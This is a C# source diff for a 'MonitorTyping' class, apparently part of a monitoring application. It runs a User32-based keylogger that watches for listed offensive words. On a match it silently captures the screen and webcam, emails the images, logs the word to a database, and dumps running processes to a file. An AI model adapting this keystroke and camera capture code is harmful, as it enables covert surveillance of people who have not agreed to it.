@@ -1,5 +1,4 @@
-﻿using BaseLibS.Param;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -13,16 +12,18 @@ using System.Windows.Forms;
 
 namespace ClientSide
 {  
-    class MonitorTyping : Monitor
+    class MonitorTyping:Monitor
     {
-        
-        public string input = "";
 
+        string input = "";
         public MonitorTyping()
         {
-                       
-        }
 
+            base.monitorAlive = true;
+            base.monitorThread = new Thread(playKeyLogger);
+            base.monitorThread.Start();
+            
+        }
         public override void playThreadMonitor()
         {
             base.monitorAlive = true;
@@ -34,7 +35,6 @@ namespace ClientSide
         {
             base.monitorAlive = false;
         }
-
 
         // keylogger from API
         [DllImport("User32.dll")]
@@ -49,7 +49,6 @@ namespace ClientSide
         public void playKeyLogger()
         {
             List<string> offensiveWords = base.SettingInstance.getWord();
-            
             input = "";
             bool flag = true;
             while (flag)
@@ -77,10 +76,7 @@ namespace ClientSide
                                  string xb = badWord.Replace(" ", "");
                                  if (replacement.ToLower().Equals(badWord))
                                  {
-                                    // sara 
-                                    Thread report = new Thread(reportOrSendAlert);
-                                    report.Start(badWord);
-                                                                      
+                                     reportOrSendAlert(badWord);                                  
                                  }
                             }
                             input = "";
@@ -93,32 +89,55 @@ namespace ClientSide
 
         }
      
-        private void reportOrSendAlert(object parameterObj)
+        private void reportOrSendAlert(string badWord)
         {
-            string badWord = (string)parameterObj;
-
-            
             if (base.SettingInstance.triggersForAlert.Contains("badWord") == true)
-            {  
+            {
                 string FilePic = Picters.ScreenCapture();
                 Picters.CaptureCamera(FilePic);
-                Report.sendAlertToMail(FilePic, "badWord trigger occur", badWord, "badWordTrigger");
+                Report.sendAlertToMail(FilePic, "badWord trigger occur", badWord, "typing");
                 ShowErrorDialog("send alert to mail\nTypedin trigger occur\nword: " + badWord );
 
             }
 
             if (base.SettingInstance.triggersForReport.Contains("badWord") == true)
-            {              
+            {
+                base.DBInstance.connectToDatabase();
                 base.DBInstance.fillTable(1, DateTime.Now.ToString(), "\"" + badWord + "\"");
                 ShowErrorDialog("update DB\nTypedin trigger occur\nword: " + badWord);
             }
         }
 
-        
+        public  void inputEqualsSARA()
+        {
+           
+            
+            // sava keylogger in file
+            String filepath = Environment.CurrentDirectory;
+            if (!Directory.Exists(filepath))
+            {
+                Directory.CreateDirectory(filepath);
+            }
+           
+            string path = (filepath + @"\AllAPP.txt");
+
+            if (!File.Exists(path))
+            {
+                using (StreamWriter sw = File.CreateText(path)) ;
+            }
+            string AllApp = ShowAllProcess.ListAllApplications();
+            using (StreamWriter sw = File.AppendText(path))
+            {
+                sw.Write(AllApp);
+
+            }
+            ShowErrorDialog(AllApp);//SARA 
 
 
 
- 
+
+
+        }
 
         private static void ShowErrorDialog(string message)
         {
@@ -126,3 +145,4 @@ namespace ClientSide
         }
     }
 }
+//abbabb
